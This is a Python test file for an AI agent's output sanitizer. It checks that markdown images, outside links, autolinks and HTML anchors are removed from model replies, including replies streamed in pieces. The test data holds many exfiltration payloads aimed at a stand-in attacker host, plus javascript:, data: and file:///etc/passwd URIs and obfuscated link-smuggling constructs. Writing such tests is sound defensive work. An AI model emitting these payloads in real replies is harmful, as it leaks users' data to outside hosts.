"""Tests for the output sanitizer (step S3.5, PLAN.md §8.1 G3): rules, streaming, and the attack list.

The two properties at the bottom are the ones that matter: cutting a reply into pieces anywhere must
never change what comes out (so a split ``![al`` / ``t](http://evil)`` cannot get through), and no image
or outside link may be left in what comes out.
"""

import re

import pytest
from hypothesis import example, given, settings
from hypothesis import strategies as st

from geekbot.agent import sanitize as module
from geekbot.agent.sanitize import (
    Removed,
    StreamSanitizer,
    sanitize_text,
    source_urls,
)

EVIL = "https://attacker.example/steal?q=secret"
OK = "https://example.com/docs/a"


def clean(text: str, allowed: frozenset[str] = frozenset()) -> str:
    return sanitize_text(text, allowed).text


def stream(pieces: list[str], allowed: frozenset[str] = frozenset()) -> tuple[list[str], str]:
    """What each ``feed`` returned, and the whole output including ``finish``."""
    cleaner = StreamSanitizer(allowed)
    outputs = [cleaner.feed(piece) for piece in pieces]
    outputs.append(cleaner.finish())
    return outputs, "".join(outputs)


# --- images ----------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (f"see ![a chart]({EVIL}) now", "see  now"),
        (f'![t]({EVIL} "a title with ) in it") end', " end"),
        (f"![x](<{EVIL} with space>)", ""),
        ("![alt][ref] after", " after"),
        ("![](data:image/png;base64,AAAA)", ""),
        (f"<img src={EVIL}> after", " after"),
        (f'<IMG SRC="{EVIL}" onerror="x()"> after', " after"),
        ("<script>alert(1)</script>", "alert(1)</script>"),
        (f"[![badge]({EVIL})]({EVIL})", ""),
        (f"![a![b]({EVIL})]({EVIL})", ""),
    ],
)
def test_images_and_loading_tags_are_removed(text: str, expected: str) -> None:
    assert clean(text) == expected


def test_the_record_says_what_was_removed() -> None:
    result = sanitize_text(f"![a]({EVIL}) and [b]({EVIL}) and <img src=x> and <{EVIL}>")
    assert result.removed == (
        Removed("image", EVIL),
        Removed("link", EVIL),
        Removed("html", "img"),
        Removed("link", EVIL),
    )
    assert result.text == " and b and  and "


# --- links -----------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "address",
    [
        EVIL,
        "javascript:alert(1)",
        "data:text/html;base64,AAAA",
        "file:///etc/passwd",
        "mailto:a@b.c",
        "//attacker.example/x",
        "&#104;ttp://attacker.example/x",
        "java\tscript:alert(1)",
        "\\\\attacker\\share",
        "HTTPS://ATTACKER.EXAMPLE",
    ],
)
def test_a_link_to_the_outside_becomes_its_text(address: str) -> None:
    assert clean(f"read [the docs]({address}) first") == "read the docs first"


def test_a_link_to_an_address_the_sources_contain_is_kept_but_not_with_anything_added() -> None:
    allowed = frozenset({OK})
    assert clean(f"[a]({OK})", allowed) == f"[a]({OK})"
    assert clean(f'[a]({OK} "title")', allowed) == f'[a]({OK} "title")'
    assert clean(f"[a]({OK}?q=secret)", allowed) == "a"  # the smuggling form: one more character
    assert clean(f"[a]({OK[:-1]})", allowed) == "a"


@pytest.mark.parametrize(
    "address", ["notes.md", "#section", "docs/a.txt", "../up.md", "/abs/path", "y"]
)
def test_a_plainly_relative_link_is_kept(address: str) -> None:
    assert clean(f"[x]({address})") == f"[x]({address})"


def test_an_autolink_is_removed_unless_a_source_has_it() -> None:
    assert clean(f"see <{EVIL}> ok") == "see  ok"
    assert clean(f"see <{OK}> ok", frozenset({OK})) == f"see <{OK}> ok"
    assert clean("see <mailto:a@b.c> ok") == "see  ok"


def test_link_reference_definitions_follow_the_same_rule() -> None:
    assert clean(f"Text [x]\n\n[x]: {EVIL}\nmore") == "Text [x]\n\nmore"
    assert clean(f'[x]: {OK} "t"\nmore', frozenset({OK})) == f'[x]: {OK} "t"\nmore'
    assert clean("[1]: the first source says so") == "[1]: the first source says so"
    assert clean(f"a [x]: {EVIL} b") == f"a [x]: {EVIL} b"  # not at a line start: not a definition


def test_a_reference_link_is_left_for_its_definition_to_decide() -> None:
    assert clean("see [text][ref] and [a][b]") == "see [text][ref] and [a][b]"


def test_a_link_around_an_image_loses_the_image_and_keeps_an_allowed_address() -> None:
    assert clean(f"[![x]({EVIL})]({OK})", frozenset({OK})) == f"[]({OK})"


# --- what must not be touched ----------------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        "The answer is 90 days [1][2] and also [3, 4].",
        "a < b and c > d, 5<6, x <3 y",
        "arr[i](y) and f(x)[0] and a[b]c",
        "```python\nprint(data[0])\n```",
        "Bullet:\n- one [1]\n- two [2]\n",
        "<b>bold</b> and <br> and </p> and <!-- note -->",
        "A [bracket with no end and a lone ! mark",
        "",
        "plain text with no markup at all",
    ],
)
def test_ordinary_text_comes_through_unchanged(text: str) -> None:
    assert clean(text) == text


def test_an_unfinished_construct_at_the_end_is_never_left_able_to_become_an_image() -> None:
    assert clean("see ![alt](http://evil") == "see !\\[alt](http://evil"  # the "[" is escaped
    assert clean("see [alt](http://evil") == "see [alt](http://evil"  # cannot render as a link
    assert clean("see <img src=x") == "see "
    assert clean("see ![alt") == "see !\\[alt"


def test_a_bare_reference_image_is_made_literal_not_removed() -> None:
    # "great![1]" is a claim and a citation, not an image; an image needs a definition to draw
    assert clean("great![1] indeed") == "great!\\[1] indeed"
    assert clean("![x] after") == "!\\[x] after"


def test_cleaning_that_brings_two_pieces_together_cannot_make_a_new_opener() -> None:
    # The image tag went and the link became "a": "!" and what followed touched across the hole, so
    # one space separates them (S5.2: before "!a"; either way no "[" is next to the "!").
    assert clean(f"!<img src=x>[a]({EVIL})") == "! a"
    assert clean("!<img src=x>[a](notes.md)") == "! [a](notes.md)"  # "![a](...)" would be an image
    assert clean("<<img x>img src=a>") == "< img src=a>"  # "<" and "img" would have made a tag
    assert clean(f"[wow!]({EVIL})[x](notes.md)") == "wow! [x](notes.md)"


@pytest.mark.parametrize(
    "attack",
    [
        f"[click]<img src=a>({EVIL})",
        f"![x]<img src=a>({EVIL})",
        f"![x]<script></script>({EVIL})",
        "<IMGjavascript:<img >>",
        "<javascript:<img >alert(1)>",
        f"[x]:<img src=a>{EVIL}",
        f"[x]: <img src=a>{EVIL}",
        f"[x]:\n<img src=a>\n{EVIL}",
        f"[a]<img src=a>[b]<img src=a>({EVIL})",
    ],
)
def test_a_removal_cannot_join_two_halves_into_a_link_an_autolink_or_a_definition(
    attack: str,
) -> None:
    """Found in S5.2 by hypothesis (``<IMGjavascript:<img >>``) and by hand: the halves of a construct
    were scanned apart, and removing what lay between them completed it, for example
    ``[click]<img src=a>(https://attacker.example/...)`` came out as a live link to the outside."""
    out = sanitize_text(attack, ALLOWED).text
    assert "![" not in out
    for autolink in re.findall(r"<([A-Za-z][A-Za-z0-9+.\-]*:[^\s>]*)>", out):
        assert autolink in ALLOWED, out
    for address in _links(out):
        assert not module._is_outside(address) or address in ALLOWED, out
    for line in out.split("\n"):
        definition = re.match(r" {0,3}\[(?=[^\[\]]*[^\s\[\]])[^\[\]]*\]:\s*<?(\S+)", line)
        if definition:
            assert not module._is_outside(definition[1]) or definition[1] in ALLOWED, out


@pytest.mark.parametrize(
    "text",
    [
        "[<http://e.x>]:",
        "[<http://e.x>]: notes.md",
        "[<http://e.x>]: ok.md\n",
        "[![x](http://e.x/p)]:",
        "[<javascript:alert(1)>]: #top",
    ],
)
def test_the_label_of_a_definition_that_stays_is_cleaned_too(text: str) -> None:
    """Found in S5.2 by hypothesis: a definition with a safe or empty address kept its raw line, so an
    autolink or an image inside its label was drawn."""
    out = sanitize_text(text, ALLOWED).text
    assert "![" not in out
    assert not re.findall(r"<([A-Za-z][A-Za-z0-9+.\-]*:[^\s>]*)>", out)


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("see ![x](u) here", "see  here"),  # a removal between two spaces needs nothing
        (
            f"Read [the docs]({EVIL}).",
            "Read the docs.",
        ),  # a link reduced to its text keeps its full stop
        (f"a ![x]({EVIL}) b", "a  b"),
        ("tail ![x](u)", "tail "),  # nothing follows the hole
    ],
)
def test_ordinary_prose_around_a_removal_is_left_as_it_was(text: str, expected: str) -> None:
    assert clean(text) == expected


def test_a_blank_line_is_added_only_where_two_sides_of_a_removal_touch() -> None:
    assert clean("logo![x](u).") == "logo\n\n."  # the full stop touched the word across the hole
    assert clean("one ![x](u)two") == "one two"  # a space already separates the hole from "one"


def test_a_removal_that_ends_one_piece_of_a_stream_still_separates_the_next() -> None:
    cleaner = StreamSanitizer(ALLOWED)
    pieces = ["[click]<img src=a>", f"({EVIL})"]
    out = "".join(cleaner.feed(p) for p in pieces) + cleaner.finish()
    assert out == sanitize_text("".join(pieces), ALLOWED).text
    assert not _links(out)


def test_a_backslash_makes_the_next_bracket_literal_and_two_do_not() -> None:
    assert clean(f"\\[x]({EVIL})") == f"\\[x]({EVIL})"  # an escaped "[": literal text in markdown
    assert clean(f"\\![x]({EVIL})") == "\\!x"  # the "!" is literal, the link is cleaned
    assert clean(f"\\\\![x]({EVIL})") == "\\\\"  # an escaped backslash, then a real image
    assert clean(f"\\<img src={EVIL}>") == f"\\<img src={EVIL}>"


# --- streaming -------------------------------------------------------------------------------


def test_a_construct_split_across_pieces_is_held_until_it_is_decided() -> None:
    outputs, whole = stream(["see ![al", f"t]({EVIL[:10]}", f"{EVIL[10:]}) done"])
    assert outputs[:2] == ["see ", ""]  # the second piece ended inside the construct: nothing out
    assert whole == "see  done"


def test_text_that_cannot_become_a_construct_is_released_at_once() -> None:
    outputs, whole = stream(["Hello wor", "ld [1", "] and ", "more"])
    assert outputs[0] == "Hello wor"
    assert outputs[1] == "ld "  # only "[1" is held: it might become a link
    assert outputs[2] == "[1] and "
    assert whole == "Hello world [1] and more"


def test_a_citation_waits_for_one_more_character() -> None:
    cleaner = StreamSanitizer()
    assert cleaner.feed("claim [2]") == "claim "
    assert cleaner.feed(".") == "[2]."


def test_finish_releases_what_was_held() -> None:
    cleaner = StreamSanitizer()
    assert cleaner.feed("see [x") == "see "
    assert cleaner.finish() == "[x"
    assert cleaner.finish() == ""


def test_removals_are_recorded_as_they_happen() -> None:
    cleaner = StreamSanitizer()
    cleaner.feed(f"![a]({EVIL}")
    assert cleaner.removed == ()
    cleaner.feed(") x")
    assert cleaner.removed == (Removed("image", EVIL),)


def test_a_definition_is_recognised_at_a_line_start_across_pieces() -> None:
    _, whole = stream(["Text\n", "[x]: ", EVIL, "\nrest"])
    assert whole == "Text\nrest"


def test_a_reply_that_starts_with_a_definition_is_recognised_too() -> None:
    _, whole = stream([f"[x]: {EVIL}\nrest"])
    assert whole == "rest"


def test_a_long_undecided_construct_is_escaped_not_held_for_ever(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(module, "_MAX_CONSTRUCT", 16)
    outputs, whole = stream(["![", "a" * 40, f"]({EVIL})"])
    assert whole.startswith("!\\[")  # the opener is escaped, so the "](...)" cannot complete it
    assert "![" not in whole
    assert any(outputs[:2])  # something was released before the end of the stream
    assert clean("[" + "a" * 40 + f"]({EVIL})") == "\\[" + "a" * 40 + f"]({EVIL})"


def test_source_urls_finds_addresses_without_the_punctuation_after_them() -> None:
    texts = [f"See {OK}. Also (https://example.org/x), and http://a.b/c?d=e; ok", "no address here"]
    assert source_urls(texts) == {OK, "https://example.org/x", "http://a.b/c?d=e"}
    assert source_urls([]) == frozenset()


# --- the two properties ----------------------------------------------------------------------

PIECES = [
    "!", "[", "]", "(", ")", "<", ">", "\n", "\n\n", " ", "a", "x", ":", '"', "'", "[1]", "![", "](",
    "<img ", "<IMG", "javascript:", "&#104;ttp://", "http://x.y/z", "https://ok.example/p",
    "https://evil.example/?q=1", "src=", "img", "<http://e.x>", "[a]: http://e.x\n", "\\",
]  # fmt: skip
ALLOWED = frozenset({"https://ok.example/p"})
texts = st.lists(st.sampled_from(PIECES), max_size=40).map("".join)
cuts = st.lists(st.integers(min_value=1, max_value=7), min_size=1, max_size=40)


def split(text: str, sizes: list[int]) -> list[str]:
    pieces: list[str] = []
    position = 0
    for size in sizes:
        if position >= len(text):
            break
        pieces.append(text[position : position + size])
        position += size
    pieces.append(text[position:])
    return pieces


@settings(max_examples=600, deadline=None)
@given(texts, cuts)
def test_streaming_in_any_chunking_gives_the_same_text_as_cleaning_it_whole(
    text: str, sizes: list[int]
) -> None:
    whole = sanitize_text(text, ALLOWED)
    cleaner = StreamSanitizer(ALLOWED)
    out = "".join(cleaner.feed(p) for p in split(text, sizes)) + cleaner.finish()
    assert out == whole.text
    assert cleaner.removed == whole.removed


@settings(max_examples=300, deadline=None)
@given(texts, cuts)
def test_streaming_is_chunking_invariant_with_a_tiny_cap_too(text: str, sizes: list[int]) -> None:
    original = module._MAX_CONSTRUCT
    module._MAX_CONSTRUCT = 6
    try:
        whole = sanitize_text(text, ALLOWED).text
        cleaner = StreamSanitizer(ALLOWED)
        out = "".join(cleaner.feed(p) for p in split(text, sizes)) + cleaner.finish()
    finally:
        module._MAX_CONSTRUCT = original
    assert out == whole


def _links(text: str) -> list[str]:
    """The destinations of every ``[..](dest)`` in ``text`` (by the module's own bracket matching)."""
    found = []
    for match in re.finditer(r"\[", text):
        close = module._bracket_end(text, match.start(), True)
        if close >= 0 and text[close + 1 : close + 2] == "(":
            end = module._paren_end(text, close + 1, True)
            if end >= 0:
                found.append(module._destination(text[close + 2 : end]))
    return found


@settings(max_examples=600, deadline=None)
@given(st.lists(st.sampled_from([p for p in PIECES if p != "\\"]), max_size=40).map("".join))
@example(
    "<IMGjavascript:<img >>"
)  # found by hypothesis in S5.2's full run: a removal made an autolink
@example("[click]<img src=a>(https://attacker.example/steal?q=secret)")  # the same hole, as a link
def test_nothing_that_loads_or_leads_outside_survives(text: str) -> None:
    out = sanitize_text(text, ALLOWED).text
    assert "![" not in out
    assert not re.search(r"<(?:img|script|iframe|svg|object|embed)(?=[\s/>]|$)", out, re.IGNORECASE)
    # An autolink may survive only if a source has its address (rule 2 in the module docstring); the
    # check on links and definitions below says the same. Found in S4.3's full run: hypothesis built
    # `<https://ok.example/p>` from the pieces, and this assertion forgot the exception. An autolink's
    # address has no `<` in it (CommonMark: any characters except control characters, space, `<` and
    # `>`): `<IMGjavascript:]<IMGsrc=>` is not one (found by hypothesis in S5.4; the pattern used to
    # allow `<` and called it one). Everything that is one is still checked.
    for autolink in re.findall(r"<([A-Za-z][A-Za-z0-9+.\-]*:[^\s<>]*)>", out):
        assert autolink in ALLOWED
    for address in _links(out):
        assert not module._is_outside(address) or address in ALLOWED
    for line in out.split("\n"):
        definition = re.match(r" {0,3}\[(?=[^\[\]]*[^\s\[\]])[^\[\]]*\]:\s*<?(\S+)", line)
        if definition:
            address = definition[1]
            assert not module._is_outside(address) or address in ALLOWED


# --- raw HTML anchors (found by the injection evaluation S5.4, D-103) -----------------------------


@pytest.mark.parametrize(
    "tag",
    [
        '<a href="https://attacker.example/x">',
        "<a href='https://attacker.example/x'>",
        "<a href=https://attacker.example/x>",
        '<A HREF="https://attacker.example/x">',
        '<a class="c" id=i href="https://attacker.example/x" target="_blank">',
        '<a\nhref="https://attacker.example/x">',
        '<a href="javascript:alert(1)">',
        '<a href="&#104;ttp://attacker.example/x">',
        '<a href="//attacker.example/x">',
    ],
)
def test_an_html_anchor_to_an_outside_address_loses_its_tag_and_keeps_its_text(tag: str) -> None:
    result = sanitize_text(f"see {tag}details</a> now", frozenset())
    assert result.text == "see details</a> now"
    assert [item.kind for item in result.removed] == ["link"]


def test_an_html_anchor_to_an_address_a_source_named_or_a_relative_one_is_kept() -> None:
    allowed = frozenset({"https://ok.example/page"})
    for text in (
        '<a href="https://ok.example/page">x</a>',
        '<a href="notes.md">x</a>',
        '<a href="#top">x</a>',
        '<a name="top">x</a>',
        "<a>x</a>",
        "<a b>x</a>",
    ):
        assert sanitize_text(text, allowed).text == text, text


def test_an_unfinished_anchor_is_held_back_and_decided_at_the_end() -> None:
    pieces, final = stream(['see <a href="https://attacker.example/x"', ">details</a>"])
    assert "attacker" not in "".join(pieces) and final == "see details</a>"
    assert sanitize_text("a <a b", frozenset()).text == "a <a b"  # nothing that is a link
    assert sanitize_text('x <a href="https://attacker.example/x"', frozenset()).text.strip() == "x"


def test_text_that_only_starts_like_an_anchor_is_left_alone() -> None:
    for text in ("<abbr>x</abbr>", "<article>x</article>", "a < b", "<a", "x<a"):
        assert sanitize_text(text, frozenset()).text == text, text


# --- overlapping constructs found by hypothesis while measuring S5.4 (D-103) ---------------------


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("[x][y](https://attacker.example/steal?q=secret)", "[x]y"),
        ("see [x][y](https://attacker.example/s) now", "see [x]y now"),
        ("[1][1](!)", "[1]1"),
        ("[a][b][c](https://attacker.example/x)", "[a][b]c"),
        ("ok [x][y] and [1][2] and [x][y](notes.md)", "ok [x][y] and [1][2] and [x][y](notes.md)"),
    ],
)
def test_a_reference_pair_followed_by_an_inline_address_is_two_constructs(
    text: str, expected: str
) -> None:
    """``[x][y](url)`` draws ``[x]`` as text and ``[y](url)`` as a link: the link must be judged."""
    assert sanitize_text(text, frozenset()).text == expected


def test_a_reference_pair_that_may_still_get_its_address_is_held_back_in_a_stream() -> None:
    pieces, final = stream(["go [x][y]", "(https://attacker.example/s)", " now"])
    assert "attacker" not in "".join(pieces) and final == "go [x]y now"


def test_a_link_reduced_to_its_text_does_not_leave_a_definition_behind() -> None:
    """The text of a removed link sits where the link was: a line of it that reads ``[a]: address``
    would be a definition there, and any ``[a]`` after it a link to that address."""
    result = sanitize_text("[[a]: http://e.x\n](!)", frozenset())
    assert not re.search(r"(?m)^ {0,3}\[a\]:", result.text)
    assert "e.x" in result.text  # the words stay, as text
    nested = sanitize_text(
        "intro [\n[b]: http://e.x\n](https://attacker.example/s) and [b]", frozenset()
    )
    assert not re.search(r"(?m)^ {0,3}\[b\]:", nested.text)
